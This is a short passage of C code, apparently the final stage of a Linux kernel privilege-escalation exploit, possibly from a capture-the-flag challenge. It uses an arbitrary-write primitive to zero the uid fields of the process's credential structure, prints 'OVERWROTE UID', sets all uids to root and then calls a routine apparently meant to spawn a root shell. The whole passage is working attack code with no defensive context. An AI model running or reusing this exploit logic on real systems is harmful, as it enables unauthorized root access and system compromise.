	copy_map_ops(writer_map, addr_map_ops);
	printf("GOING...\n");
	aaw32zero(mycred + 4, 0, writer_map_addr);
	printf("[!] OVERWROTE UID\n");
	// check it
	unsigned int ruid, euid, suid;
	getresuid(&ruid, &euid, &suid);
	setresuid(0, 0, 0);
	// NIRUGIRI
	NIRUGIRI();
	return 0;
}

